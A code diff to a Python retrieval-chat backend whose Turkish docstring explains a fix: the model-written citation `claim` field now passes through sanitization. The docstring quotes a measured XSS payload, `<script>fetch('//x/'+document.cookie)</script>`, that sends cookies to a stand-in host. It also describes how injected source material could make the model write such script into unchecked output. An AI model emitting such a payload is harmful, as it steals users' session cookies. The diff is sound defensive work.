@@ -27,6 +27,7 @@ from app.contracts import (
     GuardrailVerdict,
     RetrievedChunk,
 )
+from app.modules.guardrails.sanitize import clean
 from app.schemas.chat import LlmCitation, snippet_of
 
 #: Kümede bulunmayan bir `chunk_id` için geçici etiket. Bu değer kullanıcıya
@@ -51,6 +52,20 @@ def build_citations(
 
     Aynı kaynağa birden çok atıf tekilleştirilir — kullanıcıya aynı sayfayı üç
     kez göstermek bilgi değil gürültüdür.
+
+    **`claim` burada temizlenir.** Bu alan atıf kartında görünen ve **tamamen
+    modelin yazdığı** tek metindir; guardrail zinciri ona hiç dokunmuyordu, çünkü
+    hiçbir karar ona bakmıyor ve sözleşmede (`contracts.Citation`) bile yok.
+    Sonuç, sanitize'ın kapsamadığı bir ekran yüzeyiydi: ölçüldü, modelin
+    `claim` alanına yazdığı `<script>fetch('//x/'+document.cookie)</script>`
+    zarfa olduğu gibi çıkıyordu.
+
+    Enjeksiyon savunmasının varlık sebebi tam olarak "materyal modele talimat
+    verebilir"dir; o talimatın en kolay hedefi, kimsenin denetlemediği bir çıktı
+    alanıdır. Temizlik zincirde değil BURADA, çünkü zincir bu alanı hiç görmüyor
+    ve görmesi için sözleşmenin değişmesi gerekir (lider dosyası). Kaynağında
+    temizlemek, alanın taşındığı üç yolun (zarf, `chat_messages` kaydı, sonraki
+    geçmiş okumaları) hepsini birden kapatır.
     """
     by_id = {chunk.chunk_id: chunk for chunk in chunks}
     citations: list[Citation] = []
@@ -61,8 +76,9 @@ def build_citations(
         if item.chunk_id in seen:
             continue
         seen.add(item.chunk_id)
-        if item.claim.strip():
-            claims[item.chunk_id] = item.claim.strip()
+        claim = clean(item.claim).strip()
+        if claim:
+            claims[item.chunk_id] = claim
 
         chunk = by_id.get(item.chunk_id)
         if chunk is None:
